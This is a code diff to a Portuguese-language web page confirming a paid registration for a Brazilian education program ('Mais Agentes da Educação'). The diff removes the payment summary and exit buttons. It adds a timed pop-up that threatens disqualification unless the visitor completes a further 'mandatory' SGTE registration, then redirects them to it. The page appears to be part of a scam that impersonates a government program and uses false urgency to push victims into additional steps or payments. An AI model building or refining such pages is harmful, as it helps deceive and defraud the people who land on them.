@@ -101,44 +101,7 @@
         </div>
     </div>
 
-    <!-- Informações da Inscrição -->
-    <div class="bg-white border border-gray-200 rounded-lg p-6 mb-6">
-        <h3 class="font-semibold text-gray-800 mb-4">Dados da Inscrição</h3>
-        
-        <div class="grid md:grid-cols-2 gap-4 text-sm">
-            <div>
-                <span class="text-gray-500">Valor Pago:</span>
-                <p class="font-semibold text-gray-800">R$ 87,40</p>
-            </div>
-            <div>
-                <span class="text-gray-500">Método de Pagamento:</span>
-                <p class="font-semibold text-gray-800">PIX</p>
-            </div>
-            <div>
-                <span class="text-gray-500">Programa:</span>
-                <p class="font-semibold text-gray-800">Mais Agentes da Educação (PNAE)</p>
-            </div>
-            <div>
-                <span class="text-gray-500">Status:</span>
-                <p class="font-semibold text-green-600">Confirmada</p>
-            </div>
-        </div>
-    </div>
 
-    <!-- Botões de Ação -->
-    <div class="text-center space-x-4">
-        <a href="/" 
-           class="inline-flex items-center px-6 py-3 bg-blue-600 text-white rounded-md font-medium hover:bg-blue-700 transition-colors">
-            <i class="fas fa-home mr-2"></i>
-            Voltar ao Início
-        </a>
-        
-        <button onclick="window.print()" 
-                class="inline-flex items-center px-6 py-3 border border-gray-300 text-gray-700 rounded-md font-medium hover:bg-gray-50 transition-colors">
-            <i class="fas fa-print mr-2"></i>
-            Imprimir Comprovante
-        </button>
-    </div>
 
     <!-- Informações de Contato -->
     <div class="bg-blue-50 border border-blue-200 rounded-lg p-6 mt-6">
@@ -157,11 +120,79 @@
     </div>
 </div>
 
+<!-- Modal de Aviso Importante -->
+<div id="avisoModal" class="fixed inset-0 bg-black bg-opacity-50 hidden flex items-center justify-center z-50">
+    <div class="bg-white rounded-lg p-8 max-w-md mx-4">
+        <div class="text-center mb-6">
+            <div class="flex items-center justify-center mb-4">
+                <i class="fas fa-exclamation-triangle text-red-600 text-2xl mr-3"></i>
+                <h3 class="text-xl font-semibold text-red-600">Aviso Importante</h3>
+            </div>
+        </div>
+        
+        <div class="text-sm mb-6">
+            <p class="font-bold text-black mb-3">
+                Atenção: Para validar sua participação no Programa Mais Agentes da Educação, é Obrigatório a finalização do registro de agendamento no sistema do SGTE (Sistema de Gestão do Trabalho e da Educação).
+            </p>
+            
+            <p class="text-gray-700 mb-3">
+                O não cumprimento deste Procedimento resultará na desclassificação automática e sua vaga poderá ser destinada a outro candidato.
+            </p>
+            
+            <p class="font-bold text-black mb-4">
+                Finalize agora seu registro obrigatório para garantir sua participação na prova.
+            </p>
+        </div>
+        
+        <div class="mb-6">
+            <label class="flex items-start">
+                <input type="checkbox" id="concordoTermos" class="mt-1 mr-3">
+                <span class="text-sm">Li e concordo com os termos e condições para participação no Programa Mais Agentes da Educação.</span>
+            </label>
+        </div>
+        
+        <button id="fazerRegistro" 
+                disabled
+                class="w-full bg-gray-400 text-white py-3 px-6 rounded-md font-medium transition-colors cursor-not-allowed">
+            Fazer Registro Agora
+        </button>
+    </div>
+</div>
+
 <script>
 document.addEventListener('DOMContentLoaded', function() {
     // Gerar data atual de confirmação
     const agora = new Date();
     document.getElementById('data-confirmacao').textContent = agora.toLocaleString('pt-BR');
+    
+    // Mostrar modal após 3 segundos
+    setTimeout(function() {
+        document.getElementById('avisoModal').classList.remove('hidden');
+    }, 3000);
+    
+    // Gerenciar checkbox e botão
+    const checkbox = document.getElementById('concordoTermos');
+    const botao = document.getElementById('fazerRegistro');
+    
+    checkbox.addEventListener('change', function() {
+        if (this.checked) {
+            botao.disabled = false;
+            botao.classList.remove('bg-gray-400', 'cursor-not-allowed');
+            botao.classList.add('bg-blue-600', 'hover:bg-blue-700');
+        } else {
+            botao.disabled = true;
+            botao.classList.add('bg-gray-400', 'cursor-not-allowed');
+            botao.classList.remove('bg-blue-600', 'hover:bg-blue-700');
+        }
+    });
+    
+    // Ação do botão (redirecionar para próxima página)
+    botao.addEventListener('click', function() {
+        if (!this.disabled) {
+            // Redirecionar para a página de registro SGTE
+            window.location.href = '/registro-sgte';
+        }
+    });
     
     // Limpar dados temporários do localStorage
     localStorage.removeItem('transacao_id');
